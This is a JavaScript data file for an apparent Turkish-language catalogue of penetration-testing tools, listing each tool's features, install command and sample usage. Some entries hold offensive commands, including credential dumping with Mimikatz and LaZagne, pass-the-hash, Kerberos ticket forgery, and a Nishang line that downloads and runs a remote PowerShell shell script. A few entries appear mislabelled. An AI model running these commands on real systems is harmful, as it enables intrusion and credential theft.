const toolsData = [
  ...
  },
  {
    id: 'amass',
    name: 'Amass',
    desc: 'OWASP projesi - eksiksiz alt alan adı keşfetme aracı.',
    fullDesc: 'Amass, DNS veri kaynakları ve brute-force ile derinlemesine alt alan adı keşfi yapar.',
    icon: 'fa-sitemap',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    ...
    tagColor: '',
    features: ['Passive DNS keşfi','API tabanlı toplama','DNS brute-force','Graph analizi','Veri kaynağı 20+'],
    install: 'sudo apt update && sudo apt install -y amass',
    usage: [{ title: 'Passive', code: 'amass enum -passive -d hedef.com' },{ title: 'Active', code: 'amass enum -active -d hedef.com' },{ title: 'DB', code: 'amass db -names -d hedef.com' }]
  },
  {
    id: 'mimikatz',
    name: 'Mimikatz',
    desc: 'Windows kimlik bilgisi toplama ve Pass-the-Hash aracı.',
    fullDesc: 'Mimikatz, Windows belleğinden NTLM hash\'leri, parolalar ve kerberos ticket\'larını okur.',
    icon: 'fa-mask',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit', 'password'],
    tags: ['Windows', 'Hash', 'NTLM'],
    tagColor: 'red',
    features: ['LSASS dump','Pass-the-Hash','Kerberos ticket yönetimi','DPAPI decrypt','SAM dump'],
    install: 'sudo apt update && sudo apt install -y mimikatz',
    usage: [{ title: 'Privilege', code: 'privilege::debug' },{ title: 'Logon', code: 'sekurlsa::logonpasswords' },{ title: 'LSASS', code: 'sekurlsa::minidump lsass.dmp' },{ title: 'SAM', code: 'lsadump::sam' }]
  },
  {
    id: 'owasp-zap',
    name: 'OWASP ZAP',
    desc: 'Web uygulama güvenliği tarayıcısı - açık kaynak.',
    fullDesc: 'Zed Attack Proxy (ZAP), web uygulamalarındaki güvenlik açıklarını bulur.',
    icon: 'fa-shield-halved',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['Web Tarama', 'Proxy'],
    tagColor: 'orange',
    features: ['Otomatik tarama','Manuel test aracı','API tarama','WebSocket desteği','Raporlama'],
    install: 'sudo apt update && sudo apt install -y zaproxy',
    usage: [{ title: 'CLI Tarama', code: 'zap-cli quick-scan http://hedef.com' },{ title: 'API', code: 'zap-cli spider http://hedef.com' }]
  },
  {
    id: 'maltego',
    name: 'Maltego',
    desc: 'Grafik tabanlı link analizi ve OSINT aracı.',
    fullDesc: 'Maltego, bilgi toplama ve ilişki haritalaması için görsel bir OSINT aracıdır.',
    ...
    tags: ['OSINT', 'Grafik'],
    tagColor: 'purple',
    features: ['Varlık haritalama','Transform motoru','Sosyal medya analizi','DNS keşfi','Raporlama'],
    install: 'sudo apt update && sudo apt install -y maltego',
    usage: [{ title: 'Başlatma', code: 'maltego' }]
  },
  {
    id: 'spiderfoot',
    name: 'SpiderFoot',
    desc: 'Otomatik OSINT ve bilgi toplama framework\'ü.',
    fullDesc: 'SpiderFoot, 200\'den fazla veri kaynağıyla otomatik OSINT toplama yapar.',
    icon: 'fa-spider',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi'],
    tags: ['OSINT', 'Otomasyon'],
    tagColor: 'cyan',
    features: ['200+ veri kaynağı','Web arayüz','Modüler tarama','Raporlama','API desteği'],
    install: 'sudo apt update && sudo apt install -y spiderfoot',
    usage: [{ title: 'Web UI', code: 'spiderfoot -l 127.0.0.1:5001' },{ title: 'CLI', code: 'spiderfoot -s hedef.com -t all' }]
  },
  {
    id: 'eyewitness',
    name: 'EyeWitness',
    desc: 'Web sitelerinin ekran görüntüsünü alan araç.',
    fullDesc: 'EyeWitness, hedef web sitelerinin ekran görüntülerini otomatik olarak alır.',
    icon: 'fa-camera',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['bilgi', 'web'],
    tags: ['Screenshot', 'Keşif'],
    tagColor: 'pink',
    features: ['Web screenshot','RDP screenshot','Open VNC','PDF rapor','HEADER analizi'],
    install: 'sudo apt update && sudo apt install -y eyewitness',
    usage: [{ title: 'Screenshot', code: 'eyewitness -f urls.txt --web' },{ title: 'Dizin', code: 'eyewitness --web -d http://hedef.com' }]
  },
  {
    id: 'aquatone',
    name: 'Aquatone',
    desc: 'Web sitelerini görsel olarak keşif aracı.',
    fullDesc: 'Aquatone, hedef URL\'lerin ekran görüntüsünü alıp HTML rapor oluşturur.',
    icon: 'fa-water',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi', 'web'],
    tags: ['Screenshot', 'Görsel'],
    tagColor: 'blue',
    features: ['Konsol tabanlı','HTML tablo','HTTP header keşfi','Nmap entegrasyonu','Chrome headless'],
    install: 'sudo apt update && sudo apt install -y aquatone',
    usage: [{ title: 'Screenshot', code: 'cat urls.txt | aquatone' },{ title: 'Nmap', code: 'aquatone-take -f ip.txt' }]
  },
  {
    id: 'peirates',
    name: 'Peirates',
    desc: 'Kubernetes sızma testi aracı.',
    fullDesc: 'Peirates, Kubernetes kümelerinde sızma testi yapmak için kullanılır.',
    icon: 'fa-ship',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit'],
    ...
    tagColor: '',
    features: ['K8s yetki yükseltme','Service account keşfi','Pod izolasyon atlatma','Secrets çalma','Cluster exploitation'],
    install: 'git clone https://github.com/inguardians/peirates.git',
    usage: [{ title: 'Başlatma', code: 'sudo ./peirates' },{ title: 'Service Account', code: '# Menu: 1 > 2' }]
  },
  {
    id: 'kube-hunter',
    name: 'Kube-Hunter',
    desc: 'Kubernetes güvenlik denetim aracı.',
    fullDesc: 'Kube-Hunter, Kubernetes kümelerindeki güvenlik açıklarını tespit eder.',
    icon: 'fa-crosshairs',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['vulnerability'],
    tags: ['Kubernetes', 'Cloud'],
    tagColor: 'red',
    features: ['K8s zafiyet tarama','Pod/Service keşfi','Yetkisiz erişim tespiti','Etki analizi','Raporlama'],
    install: 'sudo apt update && sudo apt install -y kube-hunter',
    usage: [{ title: 'Tarama', code: 'kube-hunter' },{ title: 'Remote', code: 'kube-hunter --remote 192.168.1.100' }]
  },
  {
    id: 'osmedeus',
    name: 'Osmedeus',
    desc: 'Tam otomatik pentest ve OSINT framework\'ü.',
    fullDesc: 'Osmedeus, güvenlik testleri için modüler bir otomasyon platformudur.',
    icon: 'fa-robot',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['bilgi', 'web'],
    tags: ['Otomasyon', 'Framework'],
    tagColor: 'purple',
    features: ['Modüler yapı','DNS/Web/Port tarama','Zafiyet tarama','Raporlama','Cloud desteği'],
    install: 'git clone https://github.com/j3ssie/osmedeus.git',
    usage: [{ title: 'Tarama', code: 'osmedeus -t hedef.com' },{ title: 'Workspace', code: 'osmedeus -t hedef.com -w ws' }]
  },
  {
    id: 'sn1per',
    name: 'Sn1per',
    desc: 'Otomatik pentest tarama ve bilgi toplama aracı.',
    fullDesc: 'Sn1per, penetrasyon testleri için otomatik tarama yapar.',
    icon: 'fa-bolt',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['bilgi', 'exploit'],
    tags: ['Pentest', 'Otomasyon'],
    tagColor: 'orange',
    features: ['Modüler tarama','Zafiyet tespiti','Exploit önerileri','Raporlama','Haritalama'],
    install: 'git clone https://github.com/1N3/Sn1per.git',
    usage: [{ title: 'Tarama', code: 'sniper -t hedef.com' },{ title: 'Hızlı', code: 'sniper -t hedef.com -m stealth' }]
  },
  {
    id: 'legion',
    name: 'Legion',
    desc: 'Modüler güvenlik denetim framework\'ü (GUI).',
    fullDesc: 'Legion, otomatik ağ keşfi ve güvenlik denetimi için GUI tabanlı bir araçtır.',
    icon: 'fa-shield',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi', 'vulnerability'],
    tags: ['Nmap', 'GUI'],
    tagColor: 'cyan',
    features: ['Modüler yapı','Nmap entegrasyonu','SMB/SNMP keşif','Web form brute-force','Veritabanı tarama'],
    install: 'sudo apt update && sudo apt install -y legion',
    usage: [{ title: 'Başlatma', code: 'sudo legion' }]
  },
  {
    id: 'empire',
    name: 'Empire',
    desc: 'Post-exploitation framework (PowerShell/Python).',
    fullDesc: 'Empire, post-exploitation için güçlü bir framework\'tür.',
    icon: 'fa-chess-queen',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['Post-Exploit', 'PowerShell'],
    tagColor: 'red',
    features: ['PowerShell agents','Python agents','Modüler modüller','Stealth','C2 sunucu'],
    install: 'sudo apt update && sudo apt install -y powershell-empire',
    usage: [{ title: 'Sunucu', code: 'sudo powershell-empire server' },{ title: 'Client', code: 'sudo powershell-empire client' }]
  },
  {
    id: 'starkiller',
    name: 'Starkiller',
    desc: 'Empire için GUI kontrol paneli.',
    fullDesc: 'Starkiller, Empire post-exploitation aracı için modern bir web arayüzüdür.',
    icon: 'fa-skull',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['exploit'],
    tags: ['Post-Exploit', 'GUI'],
    tagColor: 'purple',
    features: ['Web arayüz','Agent yönetimi','Modül yükleme','Chat sistemi','Haritalama'],
    install: 'sudo apt update && sudo apt install -y starkiller',
    usage: [{ title: 'Başlatma', code: 'starkiller' }]
  },
  {
    id: 'havoc',
    name: 'Havoc',
    desc: 'Modern post-exploitation C2 framework\'ü.',
    fullDesc: 'Havoc, modern komut ve kontrol (C2) framework\'üdür.',
    icon: 'fa-dragon',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit'],
    tags: ['C2', 'Post-Exploit'],
    tagColor: '',
    features: ['Modern C2 paneli','Sleep obfuscation','Evasion teknikleri','DLL/Shellcode','Çoklu protocol'],
    install: 'git clone https://github.com/HavocFramework/Havoc.git',
    usage: [{ title: 'Sunucu', code: './havoc server --profile ./profiles/havoc.yaotl' },{ title: 'Client', code: './havoc client' }]
  },
  {
    id: 'wfuzz',
    name: 'WFuzz',
    desc: 'Web fuzzing ve parametre brute-force aracı.',
    fullDesc: 'WFuzz, web uygulamalarında fuzzing ve parametre keşfi için kullanılır.',
    icon: 'fa-fire',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['web'],
    tags: ['Fuzzing', 'Parametre'],
    tagColor: 'orange',
    features: ['HTTP fuzzing','Parametre brute-force','Cookie/Header fuzz','Multi-thread','Payload çeşitliliği'],
    install: 'sudo apt update && sudo apt install -y wfuzz',
    usage: [{ title: 'Dizin', code: 'wfuzz -c -w wordlist.txt http://hedef.com/FUZZ' },{ title: 'Param', code: 'wfuzz -c -z file,wordlist.txt "http://hedef.com?page=FUZZ"' },{ title: 'POST', code: 'wfuzz -c -w users.txt -d "user=FUZZ&pass=test" http://hedef.com/login' }]
  },
  {
    id: 'assetfinder',
    name: 'Assetfinder',
    desc: 'Hedefe ait varlık (subdomain) keşfetme aracı.',
    fullDesc: 'Assetfinder, pasif kaynaklardan hedef alt alan adlarını toplar.',
    icon: 'fa-search',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi'],
    tags: ['Subdomain', 'Passive'],
    tagColor: 'cyan',
    features: ['Pasif subdomain keşfi','Source API entegrasyonu','Hızlı toplama','Pipe desteği','Subdomains.txt'],
    install: 'go install github.com/tomnomnom/assetfinder@latest',
    usage: [{ title: 'Keşif', code: 'assetfinder --subs-only hedef.com' },{ title: 'Tümü', code: 'assetfinder hedef.com' }]
  },
  {
    id: 'findomain',
    name: 'Findomain',
    desc: 'Alt alan adı keşfetme aracı - güvenilir ve hızlı.',
    fullDesc: 'Findomain, 20+ API kullanarak alt alan adı keşfi yapar.',
    icon: 'fa-globe',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['Subdomain', 'API'],
    tagColor: '',
    features: ['20+ API kaynağı','Hızlı','Certificate transparency','Raporlama','JSON/CSV'],
    install: 'sudo apt update && sudo apt install -y findomain',
    usage: [{ title: 'Keşif', code: 'findomain -t hedef.com' },{ title: 'Silent', code: 'findomain -t hedef.com --silent' }]
  },
  {
    id: 'hakrawler',
    name: 'Hakrawler',
    desc: 'Web crawler ve içerik keşif aracı.',
    fullDesc: 'Hakrawler, web sitelerini otomatik crawl ederek endpoint keşfi yapar.',
    icon: 'fa-spider',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Crawl', 'Endpoint'],
    tagColor: 'purple',
    features: ['JS dosya tarama','Form keşfi','Depth kontrolü','Pipe desteği','Headless mod'],
    install: 'go install github.com/hakluke/hakrawler@latest',
    usage: [{ title: 'Crawl', code: 'echo hedef.com | hakrawler' },{ title: 'Derin', code: 'echo hedef.com | hakrawler -depth 3' }]
  },
  {
    id: 'gospider',
    name: 'Gospider',
    desc: 'Hızlı web spider ve crawling aracı.',
    fullDesc: 'Gospider, Go ile yazılmış hızlı bir web spider aracıdır.',
    icon: 'fa-bolt',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Spider', 'Crawl'],
    tagColor: 'red',
    features: ['Web spider','Form doldurma','Link extract','JavaScript parsing','Robots.txt analiz'],
    install: 'go install github.com/jaeles-project/gospider@latest',
    usage: [{ title: 'Spider', code: 'gospider -s http://hedef.com' },{ title: 'SiteMap', code: 'gospider -s http://hedef.com --sitemap' }]
  },
  {
    id: 'httprobe',
    name: 'Httprobe',
    desc: 'HTTP/HTTPS prob aracı - çalışan sunucuları bulur.',
    fullDesc: 'Httprobe, URL listelerinde çalışan HTTP/HTTPS sunucularını tespit eder.',
    icon: 'fa-plug',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi'],
    tags: ['HTTP', 'Probe'],
    tagColor: 'blue',
    features: ['HTTP/HTTPS prob','Live host tespiti','Port bazlı','Pipe desteği','Hızlı'],
    install: 'go install github.com/tomnomnom/httprobe@latest',
    usage: [{ title: 'Probe', code: 'cat urls.txt | httprobe' },{ title: 'Port', code: 'cat urls.txt | httprobe -p http:8080 -p https:8443' }]
  },
  {
    id: 'gf',
    name: 'Gf',
    desc: 'Grep wrapper - pattern eşleştirme aracı.',
    fullDesc: 'Gf, yaygın web zafiyet pattern\'lerini (XSS, SQLi, SSTI) bulmak için kullanılır.',
    icon: 'fa-code',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Pattern', 'Grep'],
    tagColor: '',
    features: ['Pattern eşleştirme','XSS/SQLi/SSTI','Özelleştirilebilir','Pipe desteği','Red detection'],
    install: 'go install github.com/tomnomnom/gf@latest',
    usage: [{ title: 'XSS', code: 'cat urls.txt | gf xss' },{ title: 'SQLi', code: 'cat urls.txt | gf sqli' },{ title: 'SSRF', code: 'cat urls.txt | gf ssrf' }]
  },
  {
    id: 'unfurl',
    name: 'Unfurl',
    desc: 'URL analiz ve parçalama aracı.',
    fullDesc: 'Unfurl, URL\'leri bileşenlerine ayırır ve analiz eder.',
    icon: 'fa-link',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['bilgi'],
    tags: ['URL', 'Analiz'],
    tagColor: 'orange',
    features: ['URL parçalama','Parametre analizi','Domain extract','Pipe desteği','Path analizi'],
    install: 'go install github.com/tomnomnom/unfurl@latest',
    usage: [{ title: 'Domain', code: 'echo "http://test.hedef.com/page" | unfurl domain' },{ title: 'Path', code: 'echo "http://hedef.com/page?id=1" | unfurl path' }]
  },
  {
    id: 'meg',
    name: 'Meg',
    desc: 'Çoklu URL\'e path tarama aracı.',
    fullDesc: 'Meg, çoklu hedefe aynı path\'i tarayarak büyük ölçekli keşif yapar.',
    ...
    tags: ['Toplu', 'Tarama'],
    tagColor: 'red',
    features: ['Toplu tarama','Banner toplama','Response header','Hızlı','Concurrent'],
    install: 'go install github.com/tomnomnom/meg@latest',
    usage: [{ title: 'Path', code: 'meg /admin hosts.txt' },{ title: 'Headers', code: 'meg -H "Authorization: Bearer token" /api hosts.txt' }]
  },
  {
    id: 'qsreplace',
    name: 'Qsreplace',
    desc: 'Query string replace ve fuzzing aracı.',
    fullDesc: 'Qsreplace, URL\'lerdeki değerleri değiştirerek fuzzing yapar.',
    ...
    tags: ['Fuzzing', 'Parametre'],
    tagColor: 'cyan',
    features: ['Query replace','Parametre fuzzing','Pipe desteği','Encode desteği','Hızlı'],
    install: 'go install github.com/tomnomnom/qsreplace@latest',
    usage: [{ title: 'Replace', code: 'cat urls.txt | qsreplace "test"' },{ title: 'XSS', code: 'cat urls.txt | qsreplace "<script>alert(1)</script>"' }]
  },
  {
    id: 'kerbrute',
    name: 'Kerbrute',
    desc: 'Kerberos enumeration ve brute-force aracı.',
    fullDesc: 'Kerbrute, AD üzerinde Kerberos kullanıcı enumeration ve brute-force yapar.',
    icon: 'fa-user',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit', 'password'],
    tags: ['Kerberos', 'AD'],
    tagColor: '',
    features: ['Kullanıcı enumeration','Parola spray','Brute force','ASREP-Roast','Kerberoasting'],
    install: 'go install github.com/ropnop/kerbrute@latest',
    usage: [{ title: 'Enum', code: 'kerbrute userenum -d hedef.com users.txt --dc 192.168.1.100' },{ title: 'Brute', code: 'kerbrute bruteuser -d hedef.com passwords.txt admin --dc 192.168.1.100' }]
  },
  {
    id: 'nishang',
    name: 'Nishang',
    desc: 'PowerShell güvenlik ve post-exploit araç seti.',
    fullDesc: 'Nishang, PowerShell tabanlı güvenlik araçları ve script koleksiyonudur.',
    icon: 'fa-terminal',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['exploit'],
    ...
    tagColor: 'blue',
    features: ['Reverse shell','Keylogger','Port scan','Credential theft','Dosya transfer'],
    install: 'sudo apt update && sudo apt install -y nishang',
    usage: [{ title: 'Reverse Shell', code: 'powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://IP/Shell.ps1\')"' },{ title: 'Keylogger', code: 'powershell -exec bypass -f Keylogger.ps1' }]
  },
  {
    id: 'lazagne',
    name: 'LaZagne',
    desc: 'Windows/Linux/Mac parola kurtarma aracı.',
    fullDesc: 'LaZagne, sistemlerde saklanan parolaları kurtarır.',
    icon: 'fa-key',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['password'],
    tags: ['Parola', 'Kurtarma'],
    tagColor: 'purple',
    features: ['Browser parolaları','WiFi şifreleri','Mail şifreleri','Veritabanı şifreleri','Yazılım şifreleri'],
    install: 'git clone https://github.com/AlessandroZ/LaZagne.git',
    usage: [{ title: 'Tümü', code: 'python laZagne.py all' },{ title: 'Browser', code: 'python laZagne.py browsers' },{ title: 'WiFi', code: 'python laZagne.py wifi' }]
  },
  {
    id: 'sliver',
    name: 'Sliver',
    desc: 'Gelişmiş C2 framework - implant tabanlı.',
    fullDesc: 'Sliver, modern komut ve kontrol (C2) framework\'üdür.',
    icon: 'fa-microchip',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['C2', 'İmplant'],
    tagColor: 'red',
    features: ['Cross-platform implant','Mutual TLS','HTTP(S) C2','DNS C2','Operators/Servers'],
    install: 'sudo apt update && sudo apt install -y sliver',
    usage: [{ title: 'Sunucu', code: 'sliver-server' },{ title: 'Client', code: 'sliver-client' }]
  },
  {
    id: 'mythic',
    name: 'Mythic',
    desc: 'Kapsamlı C2 framework ve paylaod yönetimi.',
    fullDesc: 'Mythic, kapsamlı komut ve kontrol framework\'üdür.',
    ...
    tags: ['C2', 'Payload'],
    tagColor: 'orange',
    features: ['Multi-agent','Web UI','Payload varyasyonu','Docker tabanlı','API desteği'],
    install: 'git clone https://github.com/its-a-feature/Mythic.git',
    usage: [{ title: 'Başlatma', code: 'sudo ./mythic_cli.sh install; sudo ./mythic_cli.sh start' }]
  },
  {
    id: 'pwncat',
    name: 'PwnCat',
    desc: 'Netcat tabanli gelismis versiyon - reverse shell.',
    fullDesc: 'PwnCat, reverse shell bağlantıları için gelişmiş bir araçtır.',
    icon: 'fa-terminal',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['exploit'],
    tags: ['Reverse Shell', 'Listener'],
    tagColor: 'cyan',
    features: ['Otomatik shell upgrade','Dosya transferi','Tab completion','Python3','Privesc modül'],
    install: 'pip3 install pwncat-cs',
    usage: [{ title: 'Dinleyici', code: 'pwncat-cs -lp 4444' },{ title: 'Connect', code: 'pwncat-cs ATTACKER:4444' }]
  },
  {
    id: 'covenant',
    name: 'Covenant',
    desc: '.NET tabanlı C2 framework.',
    fullDesc: 'Covenant, .NET framework üzerinde çalışan bir C2 aracıdır.',
    icon: 'fa-file-code',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit'],
    tags: ['C2', '.NET'],
    tagColor: '',
    features: ['Web UI C2 paneli','GRUNT implant','Modüler yapı','Yanıltma teknikleri','Task sistemi'],
    install: 'git clone https://github.com/cobbr/Covenant.git',
    usage: [{ title: 'Başlatma', code: 'dotnet run --project Covenant/Covenant.csproj' }]
  },
  {
    id: 'pypykatz',
    name: 'Pypykatz',
    desc: 'Python ile yazılmış Mimikatz alternatifi.',
    fullDesc: 'Pypykatz, Python ile yazilmis kimlik bilgisi toplama aracidir.',
    icon: 'fa-python',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['exploit', 'password'],
    tags: ['Python', 'Mimikatz'],
    tagColor: 'pink',
    features: ['LSASS dump analizi','NTLM hash çıkarma','Kerberos ticket','DPAPI decrypt','Cross-platform'],
    install: 'pip3 install pypykatz',
    usage: [{ title: 'LSASS', code: 'pypykatz lsa minidump lsass.dmp' },{ title: 'Live', code: 'pypykatz live' }]
  },
  {
    id: 'rubeus',
    name: 'Rubeus',
    desc: 'Kerberos saldırı ve keşif araç takımı.',
    fullDesc: 'Rubeus, Kerberos protokolü üzerinde saldırı ve keşif için kullanılır.',
    icon: 'fa-hat-wizard',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['exploit'],
    ...
    tagColor: 'purple',
    features: ['Kerberoasting','ASREP-Roast','Pass-the-Ticket','Silver/Golden ticket','Overpass-the-hash'],
    install: 'wget https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe',
    usage: [{ title: 'Kerberoast', code: 'Rubeus.exe kerberoast /domain:hedef.com' },{ title: 'ASREP', code: 'Rubeus.exe asreproast /domain:hedef.com' },{ title: 'Ticket', code: 'Rubeus.exe ptt /ticket:ticket.kirbi' }]
  },
  {
    id: 'kekeo',
    name: 'Kekeo',
    desc: 'Kerberos güvenlik aracı - ticket yönetimi.',
    fullDesc: 'Kekeo, Kerberos ticket manipülasyonu ve saldırıları için kullanılır.',
    icon: 'fa-key',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['exploit'],
    tags: ['Kerberos', 'TGT'],
    tagColor: 'blue',
    features: ['TGT request','Silver ticket','Golden ticket','Skeleton key','Trust ticket'],
    install: 'wget https://github.com/gentilkiwi/kekeo/releases/latest/download/kekeo.exe',
    usage: [{ title: 'TGT', code: 'kekeo "tgt::ask /user:admin /domain:hedef.com /password:pass123"' },{ title: 'Silver', code: 'kekeo "kerberos::golden /user:admin /domain:hedef.com /sid:S-1-5-21-... /target:CIFS/hedef.com /service:krbtgt"' }]
  },
  {
    id: 'nanodump',
    name: 'Nanodump',
    desc: 'Minimal LSASS dumper aracı.',
    fullDesc: 'Nanodump, Windows LSASS belleğini minimal boyutta dump eder.',
    icon: 'fa-bolt',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['LSASS', 'Dump'],
    tagColor: 'red',
    features: ['Küçük boyut','Minimal footprint','Anti-debug','LSASS dump','Bypass'],
    install: 'wget https://github.com/helpsystems/nanodump/releases/latest/download/nanodump.exe',
    usage: [{ title: 'Dump', code: 'nanodump.exe lsass.dmp' }]
  },
  {
    id: 'smbmap',
    name: 'SMBMap',
    desc: 'SMB enumeration ve keşif aracı.',
    fullDesc: 'SMBMap, SMB paylaşımlarında dosya ve yetki keşfi yapar.',
    icon: 'fa-folder-open',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['SMB', 'Exploration'],
    tagColor: '',
    features: ['SMB paylaşım keşfi','Dosya listeleme','Yetki kontrolü','Dosya indirme/yükleme','Rekürsif tarama'],
    install: 'sudo apt update && sudo apt install -y smbmap',
    usage: [{ title: 'Paylaşımlar', code: 'smbmap -H 192.168.1.100' },{ title: 'Guest', code: 'smbmap -u guest -p "" -H 192.168.1.100' },{ title: 'Rekürsif', code: 'smbmap -H 192.168.1.100 -R' }]
  },
  {
    id: 'pth-tools',
    name: 'Pass-the-Hash Toolkit',
    desc: 'Pass-the-Hash saldırı araç seti.',
    fullDesc: 'Pass-the-Hash toolkit, Windows\'ta hash tabanlı kimlik doğrulama saldırıları için kullanılır.',
    icon: 'fa-fingerprint',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['exploit'],
    tags: ['Pass-the-Hash', 'NTLM'],
    tagColor: 'orange',
    features: ['SMB PtH','RDP PtH','WinRM PtH','WMI PtH','NTLM relay'],
    install: 'sudo apt update && sudo apt install -y passing-the-hash',
    usage: [{ title: 'SMB PTH', code: 'pth-smbclient //192.168.1.100/share -U admin%HASH' },{ title: 'WMI PTH', code: 'pth-wmic -U admin%HASH //192.168.1.100 "SELECT * FROM Win32_ComputerSystem"' }]
  },
  {
    id: 'donpapi',
    name: 'DonPAPI',
    desc: 'Depolanmış bilgileri toplama aracı.',
    fullDesc: 'DonPAPI, Windows sistemlerinde depolanmış hassas bilgileri toplar.',
    icon: 'fa-database',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['password', 'exploit'],
    tags: ['Credential', 'Dump'],
    tagColor: 'cyan',
    features: ['Browser credential','WiFi profil','Vault credential','MobaXterm/RDCM','FileZilla/WinSCP'],
    install: 'pip3 install donpapi',
    usage: [{ title: 'Topla', code: 'donpapi dump -d hedef.com -u admin -p pass123' }]
  },
  {
    id: 'bloodhound-import',
    name: 'BloodHound.py',
    desc: 'BloodHound veri toplama Python istemcisi.',
    fullDesc: 'BloodHound.py, AD\'den BloodHound verisi toplar.',
    icon: 'fa-share-nodes',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['exploit', 'bilgi'],
    tags: ['BloodHound', 'AD'],
    tagColor: 'purple',
    features: ['LDAP sorgulama','Session toplama','ACL hesaplama','Local admin tespiti','JSON çıktı'],
    install: 'pip3 install bloodhound',
    usage: [{ title: 'Topla', code: 'bloodhound-python -u admin -p pass123 -d hedef.com -c All -ns 192.168.1.100' }]
  },
  {
    id: 'adpeas',
    name: 'ADPEAS',
    desc: 'Active Directory güvenlik denetim aracı.',
    fullDesc: 'ADPEAS, AD yapılandırma hatalarını ve zafiyetlerini tespit eder.',
    icon: 'fa-shield-halved',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['vulnerability', 'bilgi'],
    tags: ['AD', 'Denetim'],
    tagColor: '',
    features: ['AD yapılandırma analizi','GPO denetimi','Yetki kontrolü','Delegation tespiti','Raporlama'],
    install: 'git clone https://github.com/outflanknl/AdPEAS.git',
    usage: [{ title: 'Tarama', code: 'python adpeas.py -d hedef.com -u admin -p pass123' }]
  },
  {
    id: 'pingcastle',
    name: 'PingCastle',
    desc: 'Active Directory güvenlik değerlendirme aracı.',
    fullDesc: 'PingCastle, AD güvenlik risklerini değerlendirir ve raporlar.',
    icon: 'fa-castle',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['vulnerability'],
    tags: ['AD', 'Güvenlik'],
    tagColor: 'blue',
    features: ['Risk değerlendirme','Zafiyet tespiti','Yapılandırma hataları','Yetki yükseltme','HTML rapor'],
    install: 'wget https://github.com/vletoux/pingcastle/releases/latest/download/PingCastle.exe',
    usage: [{ title: 'Değerlendirme', code: 'PingCastle.exe --level Full --server hedef.com --user admin --password pass123' }]
  },
  {
    id: 'purpleknight',
    name: 'PurpleKnight',
    desc: 'Active Directory güvenlik tarayıcısı.',
    fullDesc: 'PurpleKnight, AD güvenlik açıklarını tespit eden bir tarayıcıdır.',
    icon: 'fa-chess-knight',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['vulnerability'],
    tags: ['AD', 'Tarama'],
    tagColor: 'red',
    features: ['AD zafiyet tarama','Yetki kontrolü','GPO analizi','Delegation tespiti','Detaylı rapor'],
    install: 'git clone https://github.com/p0dalirius/PurpleKnight.git',
    usage: [{ title: 'Tarama', code: 'python purpleknight.py -d hedef.com -u admin -p pass123' }]
  },
  {
    id: 'inveigh',
    name: 'Inveigh',
    desc: 'Windows LLMNR/NBNS/mDNS spoofing aracı.',
    fullDesc: 'Inveigh, Windows üzerinde LLMNR/NBT-NS/mDNS spoofing yapar.',
    icon: 'fa-triangle-exclamation',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['exploit'],
    tags: ['Spoofing', 'MITM'],
    tagColor: 'orange',
    features: ['LLMNR spoofing','NBNS spoofing','NTLMv1/v2 capture','HTTP/HTTPS','SMB capture'],
    install: 'git clone https://github.com/Kevin-Robertson/Inveigh.git',
